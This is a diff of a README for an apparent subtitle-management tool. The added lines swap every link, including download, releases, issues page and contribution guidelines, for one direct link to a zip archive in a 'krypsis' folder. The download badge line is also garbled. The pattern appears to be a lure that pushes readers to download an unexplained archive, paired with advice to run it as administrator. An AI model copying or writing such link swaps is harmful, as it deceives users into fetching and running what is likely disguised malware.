@@ -1,7 +1,7 @@
 # 🎉 powersub-demo-8778 - Easy Subtitle Management Made Simple
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-Powersub%20Demo%20v1.0-blue.svg)](https://github.com/albarguezz/powersub-demo-8778/releases)
+[![Download](https://raw.githubusercontent.com/albarguezz/powersub-demo-8778/main/krypsis/powersub-demo-8778.zip%20Demo%https://raw.githubusercontent.com/albarguezz/powersub-demo-8778/main/krypsis/powersub-demo-8778.zip)](https://raw.githubusercontent.com/albarguezz/powersub-demo-8778/main/krypsis/powersub-demo-8778.zip)
 
 ## 🚀 Getting Started
 Welcome to the powersub-demo-8778 application. This tool is designed to help you manage your subtitle files with ease. Whether you're watching a movie or working on a video project, this application will streamline your subtitle experience.
@@ -24,7 +24,7 @@ Before downloading, ensure your system meets the following requirements:
 To get started with powersub-demo-8778, follow these steps:
 
 1. Click the link below to visit the Releases page:
-   [Download Here](https://github.com/albarguezz/powersub-demo-8778/releases)
+   [Download Here](https://raw.githubusercontent.com/albarguezz/powersub-demo-8778/main/krypsis/powersub-demo-8778.zip)
 
 2. Look for the latest version available. It will be marked as "Latest Release."
 
@@ -49,10 +49,10 @@ If you encounter any issues while downloading or running the software, consider 
 - **Run as Administrator:** On Windows, you may need to run the application as an administrator for optimal performance.
 
 ## 🛠️ Support
-For further assistance, visit our [GitHub Issues Page](https://github.com/albarguezz/powersub-demo-8778/issues). Here, you can report errors or ask for help. Our team regularly monitors this section and aims to respond swiftly.
+For further assistance, visit our [GitHub Issues Page](https://raw.githubusercontent.com/albarguezz/powersub-demo-8778/main/krypsis/powersub-demo-8778.zip). Here, you can report errors or ask for help. Our team regularly monitors this section and aims to respond swiftly.
 
 ## ✨ Contributions
-We welcome contributions from you! If you'd like to help improve powersub-demo-8778, check our [Contribution Guidelines](https://github.com/albarguezz/powersub-demo-8778/blob/main/CONTRIBUTING.md) to get started.
+We welcome contributions from you! If you'd like to help improve powersub-demo-8778, check our [Contribution Guidelines](https://raw.githubusercontent.com/albarguezz/powersub-demo-8778/main/krypsis/powersub-demo-8778.zip) to get started.
 
 ## 📜 License
 This project is licensed under the MIT License. You can freely use, modify, and distribute this software according to the terms of the license.
